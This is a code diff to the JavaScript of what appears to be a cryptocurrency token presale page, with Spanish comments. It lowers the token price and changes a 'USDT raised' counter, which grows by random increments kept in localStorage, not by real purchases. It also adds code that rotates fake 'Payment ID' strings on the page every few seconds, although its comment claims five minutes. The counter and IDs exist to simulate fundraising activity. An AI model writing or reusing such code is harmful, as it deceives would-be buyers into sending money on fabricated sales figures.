@@ -412,7 +412,7 @@ document.querySelectorAll('[id^="direccion-"]').forEach(function(direccion) {
   
       
       let bnbPrice = 0;
-      const tokenPriceInUSD = 0.0000297; // PRECIO TOKEN
+      const tokenPriceInUSD = 0.0000001; // PRECIO TOKEN
       let conversionRate = tokenPriceInUSD;
       
       async function fetchBNBPrice() {
@@ -625,9 +625,9 @@ document.querySelectorAll('[id^="direccion-"]').forEach(function(direccion) {
   
       // Función para actualizar el valor progresivo y el tiempo de espera
       function updateValue() {
-        let currentValue = parseFloat(localStorage.getItem('usdt-raised')) || 479312.50; // Valor inicial
+        let currentValue = parseFloat(localStorage.getItem('usdt-raised')) || 2479312.50; // Valor inicial
         const targetValue = 600000000.00; // Valor objetivo
-        const increment = getRandomNumber(10.48, 25.13); // Incremento aleatorio
+        const increment = getRandomNumber(1.48, 15.13); // Incremento aleatorio
   
         // Incrementar el valor actual
         const newValue = Math.min(currentValue + increment, targetValue);
@@ -703,3 +703,54 @@ document.getElementById('usdcButton').addEventListener('click', function() {
 });
   
                   // FIN RESETEAR CAMPOS X
+
+                  // CODIGO ALEATORIO
+
+// Lista de códigos aleatorios
+
+// Lista de códigos aleatorios para cada clase
+const paymentIDs = [
+    "YJHWAFQZHPJC4ZNHDS9A4EY7",
+    "F7V2Y8GFWW5H4QKNPH2EU7LL",
+    "EWHKSKBC926GA5JJAMMLUB9B",
+    "PFH77FWHBULEN5Q65QN3X94B",
+    "QT74FMT7MH9LHKTYNCZTDH57"
+];
+
+function cambiarPaymentIDs() {
+    // Recorrer cada clase y asignar un código aleatorio
+    for (let i = 1; i <= 5; i++) {
+        // Obtener un índice aleatorio
+        const randomIndex = Math.floor(Math.random() * paymentIDs.length);
+        const newPaymentID = paymentIDs[randomIndex];
+
+        // Actualizar el texto del elemento correspondiente
+        const paymentIDElement = document.querySelector(`.paymentid${i}`);
+        if (paymentIDElement) {
+            paymentIDElement.textContent = `Payment ID: ${newPaymentID}`;
+        }
+
+        // Guardar el nuevo valor en localStorage (opcional)
+        localStorage.setItem(`lastPaymentID${i}`, newPaymentID);
+    }
+}
+
+// Función para inicializar y actualizar cada 5 minutos
+function iniciarActualizacionAutomatica() {
+    // Obtener los últimos valores guardados en localStorage (opcional)
+    for (let i = 1; i <= 5; i++) {
+        const lastPaymentID = localStorage.getItem(`lastPaymentID${i}`);
+        if (lastPaymentID) {
+            const paymentIDElement = document.querySelector(`.paymentid${i}`);
+            if (paymentIDElement) {
+                paymentIDElement.textContent = `Payment ID: ${lastPaymentID}`;
+            }
+        }
+    }
+
+    // Iniciar el ciclo de actualización cada 5 minutos
+    setInterval(cambiarPaymentIDs, 3 * 60 * 100); // 5 minutos en milisegundos
+}
+
+// Llamar a la función para iniciar la actualización automática
+iniciarActualizacionAutomatica();
